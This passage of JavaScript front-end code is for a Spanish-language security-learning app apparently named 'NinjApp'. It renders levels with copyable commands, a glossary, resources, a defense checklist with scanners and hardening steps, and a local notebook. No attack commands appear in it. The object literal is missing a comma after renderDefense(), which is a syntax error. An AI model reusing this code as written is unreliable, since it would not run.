                  <div class="modal-command" style="cursor:pointer;font-size:10px;margin:0;" onclick="if(navigator.clipboard){navigator.clipboard.writeText('${p.cmd.replace(/'/g,"\\'")}').then(()=>{this.innerHTML='✓ Copiado!';setTimeout(()=>this.innerHTML='${p.cmd.replace(/'/g,"\\'")}',1200)});}">${p.cmd}</div>
                </div>
              `).join('')}
            </div>

            <div class="modal-section-title" style="color:var(--accent-yellow);">📖 Aprenderás</div>
            ${l.learn.map(t => `<div class="topic-item"><span class="topic-check">○</span><span>${t}</span></div>`).join('')}
          </div>
        </div>
      </div>
    `).join('');

    container.querySelectorAll('.level-card').forEach(card => {
      card.querySelector('.level-header').addEventListener('click', () => card.classList.toggle('open'));
    });
  },

  renderGlossary() {
    const container = document.getElementById('glossary-content');
    const gl = [...DATA.glossary].sort((a, b) => a.term.localeCompare(b.term));
    let html = gl.map((entry, i) => `
      <div class="glossary-entry" data-letter="${entry.term[0].toUpperCase()}">
        <div class="glossary-term">${entry.term}</div>
        <div class="glossary-def">${entry.def}</div>
      </div>
    `).join('');
    container.innerHTML = html;
  },

  renderResources() {
    const container = document.getElementById('resources-content');
    container.innerHTML = DATA.resources.map(r => `
      <a href="${r.url}" target="_blank" rel="noopener noreferrer" class="resource-card" style="text-decoration:none;color:inherit;">
        <div class="resource-icon">${r.icon}</div>
        <div class="resource-info">
          <div class="resource-title">${r.title}</div>
          <div class="resource-desc">${r.desc}</div>
          <span class="resource-link">→ Visitar</span>
        </div>
      </a>
    `).join('');
  },

  renderDefense() {
    const container = document.getElementById('defense-content');
    const d = DATA.defense;

    const savedChecks = JSON.parse(localStorage.getItem('ninjapp_defense') || '{}');
    const doneCount = Object.values(savedChecks).filter(Boolean).length;
    const totalChecks = d.checklist.length;
    const score = Math.round((doneCount / totalChecks) * 100);

    container.innerHTML = `
      <div class="card defense-score">
        <div class="defense-score-number">${score}%</div>
        <div class="defense-score-label">Tu puntuación de seguridad</div>
        <div class="defense-score-bar">
          <div class="defense-score-fill" style="width:${score}%"></div>
        </div>
        <div style="font-size:11px;color:var(--text-muted);margin-top:8px;font-family:var(--font-mono);">${doneCount}/${totalChecks} medidas activas</div>
      </div>

      <div class="defense-tab-row">
        <span class="defense-tab active" data-dtab="checklist">✅ Checklist</span>
        <span class="defense-tab" data-dtab="checks">🔎 Scanners</span>
        <span class="defense-tab" data-dtab="hardening">🔧 Hardening</span>
      </div>

      <div id="defense-checklist" class="dtab-content active">
        <div class="card" style="border-color:rgba(0,212,255,0.2);">
          <div class="card-title" style="color:var(--accent-cyan);font-size:12px;">✅ Checklist de Seguridad Personal</div>
          <div class="card-desc">Marca las medidas que ya tienes implementadas:</div>
        </div>
        ${d.checklist.map(item => `
          <div class="checklist-item ${savedChecks[item.id] ? 'done' : ''}" data-cid="${item.id}">
            <div class="checklist-box">${savedChecks[item.id] ? '✓' : ''}</div>
            <div class="checklist-text">${item.icon} ${item.text}</div>
          </div>
        `).join('')}
      </div>

      <div id="defense-checks" class="dtab-content" style="display:none;">
        ${d.checks.map(c => `
          <div class="card">
            <div class="card-title">${c.icon} ${c.title}</div>
            <div class="card-desc" style="margin-bottom:8px;">${c.desc}</div>
            ${c.commands.map(cmd => `
              <div style="margin-bottom:6px;">
                <div style="font-size:11px;color:var(--text-secondary);margin-bottom:3px;">${cmd.label}</div>
                <div class="defense-result" style="cursor:pointer;" onclick="if(navigator.clipboard){navigator.clipboard.writeText('${cmd.cmd.replace(/'/g,"\\'")}').then(()=>{this.innerHTML='✓ Copiado!';setTimeout(()=>this.innerHTML='${cmd.cmd.replace(/'/g,"\\'")}',1200)});}">${cmd.cmd}</div>
              </div>
            `).join('')}
            <div style="margin-top:8px;padding:8px;background:rgba(255,187,0,0.05);border-left:2px solid var(--accent-yellow);border-radius:4px;">
              <div style="font-size:10px;color:var(--accent-yellow);font-family:var(--font-mono);">💡 ${c.indicator}</div>
            </div>
          </div>
        `).join('')}
      </div>

      <div id="defense-hardening" class="dtab-content" style="display:none;">
        ${d.hardening.map(h => `
          <div class="card">
            <div class="card-title">${h.icon} ${h.title}</div>
            <div style="margin-top:8px;">
              ${h.steps.map((s, i) => `
                <div class="topic-item">
                  <span class="topic-check">${i+1}.</span>
                  <span>${s}</span>
                </div>
              `).join('')}
            </div>
          </div>
        `).join('')}
      </div>
    `;

    // Checklist toggle
    container.querySelectorAll('.checklist-item').forEach(item => {
      item.addEventListener('click', () => {
        const cid = item.dataset.cid;
        const saved = JSON.parse(localStorage.getItem('ninjapp_defense') || '{}');
        saved[cid] = !saved[cid];
        localStorage.setItem('ninjapp_defense', JSON.stringify(saved));
        this.renderDefense();
      });
    });

    // Tab switching
    container.querySelectorAll('.defense-tab').forEach(tab => {
      tab.addEventListener('click', () => {
        container.querySelectorAll('.defense-tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        container.querySelectorAll('.dtab-content').forEach(c => c.style.display = 'none');
        document.getElementById(`defense-${tab.dataset.dtab}`).style.display = 'block';
      });
    });
  }
  // ===== NOTEBOOK =====

  loadNotebook() {
    try {
      return JSON.parse(localStorage.getItem('ninjapp_notebook') || '{"entries":[]}');
    } catch(e) {
      return { entries: [] };
    }
  },

  saveNotebook() {
    localStorage.setItem('ninjapp_notebook', JSON.stringify(this.notebookData));
  },

  addNotebookEntry(type, content, tags) {
    if (!content) return;
    this.notebookData.entries.unshift({
      id: Date.now() + '_' + Math.random().toString(36).slice(2, 6),
      type: type || 'note',
      content: content,
      tags: tags || [],
      timestamp: Date.now()
    });
    this.saveNotebook();
    if (document.getElementById('section-notebook').classList.contains('active')) {
      this.renderNotebook();
    }
  },

  deleteNotebookEntry(id) {
    this.notebookData.entries = this.notebookData.entries.filter(e => e.id !== id);
    this.saveNotebook();
    this.renderNotebook();
  },

  clearNotebook() {
    if (!confirm('¿Borrar todas las entradas del block de notas?')) return;
    this.notebookData.entries = [];
    this.saveNotebook();
    this.renderNotebook();
  },

  exportNotebook() {
    const lines = this.notebookData.entries.map(e => {
      const date = new Date(e.timestamp).toLocaleString('es');
      return `[${date}] [${e.type}] ${e.content}`;
    }).join('\n---\n');
    if (!lines) { alert('No hay entradas para exportar.'); return; }
    if (navigator.clipboard) {
      navigator.clipboard.writeText(lines).then(() => alert('Block de notas copiado al portapapeles. Pégalo donde quieras.'));
    } else {
      const blob = new Blob([lines], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = `ninjapp-notas-${Date.now()}.txt`;
      a.click();
    }
  },

  renderNotebook() {
    const container = document.getElementById('notebook-content');
    if (!container) return;

    const entryCount = this.notebookData.entries.length;
    const commandCount = this.notebookData.entries.filter(e => e.type === 'command').length;

    let html = `
      <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;">
        <button onclick="App.addNotebookEntry('note', document.getElementById('notebook-input').value)" style="flex:1;min-width:140px;padding:10px 16px;background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:4px;color:var(--accent-cyan);font-family:var(--font-mono);font-size:11px;cursor:pointer;">➕ Agregar nota</button>
        <button onclick="App.exportNotebook()" style="padding:10px 16px;background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.3);border-radius:4px;color:var(--accent-green);font-family:var(--font-mono);font-size:11px;cursor:pointer;">📋 Exportar</button>
        <button onclick="App.clearNotebook()" style="padding:10px 16px;background:rgba(255,68,68,0.1);border:1px solid rgba(255,68,68,0.3);border-radius:4px;color:#ff4444;font-family:var(--font-mono);font-size:11px;cursor:pointer;">🗑 Vaciar</button>
      </div>
      <div style="display:flex;gap:6px;margin-bottom:12px;">
        <input id="notebook-input" type="text" placeholder="Escribe una nota o pega un resultado..." style="flex:1;padding:8px 12px;background:#111118;border:1px solid #222244;border-radius:4px;color:#e0e0e0;font-family:var(--font-mono);font-size:12px;outline:none;" onkeydown="if(event.key==='Enter'){App.addNotebookEntry('note',this.value)}">
      </div>
      <div style="font-size:10px;color:var(--text-muted);margin-bottom:8px;font-family:var(--font-mono);">
        ${entryCount} entradas · ${commandCount} comandos
      </div>
    `;

    if (entryCount === 0) {
      html += `<div style="text-align:center;padding:40px 20px;color:var(--text-muted);font-size:12px;">
        <div style="font-size:32px;margin-bottom:8px;">📓</div>
        <div>No hay entradas todavía.</div>
        <div style="font-size:10px;margin-top:4px;">Los comandos que ejecutes se guardarán aquí automáticamente.</div>
      </div>`;
    } else {
      html += `<div style="display:flex;flex-direction:column;gap:6px;">`;
      this.notebookData.entries.forEach(e => {
        const date = new Date(e.timestamp).toLocaleString('es', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' });
        const typeIcon = { command: '💻', note: '📝', result: '📊' }[e.type] || '📄';
        const typeColor = { command: 'var(--accent-green)', note: 'var(--accent-cyan)', result: '#ffaa00' }[e.type] || 'var(--text-secondary)';
        const cmdClass = e.type === 'command' ? 'notebook-cmd' : '';
        html += `
          <div style="background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:4px;padding:8px 10px;position:relative;">
            <div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;">
              <span style="font-size:11px;">${typeIcon}</span>
              <span style="font-size:9px;color:${typeColor};font-family:var(--font-mono);text-transform:uppercase;">${e.type}</span>
              <span style="font-size:9px;color:var(--text-muted);margin-left:auto;">${date}</span>
              <button onclick="App.deleteNotebookEntry('${e.id}')" style="background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:12px;padding:0 2px;">✕</button>
            </div>
            <div style="font-size:11px;color:var(--text-primary);font-family:var(--font-mono);word-break:break-all;line-height:1.4;" class="${cmdClass}">${this.escapeHtml(e.content)}</div>
          </div>
        `;
      });
      html += `</div>`;
    }

    container.innerHTML = html;
  },

  escapeHtml(str) {
    const d = document.createElement('div');
    d.textContent = str;
    return d.innerHTML;
  }
};

document.addEventListener('DOMContentLoaded', () => App.init());
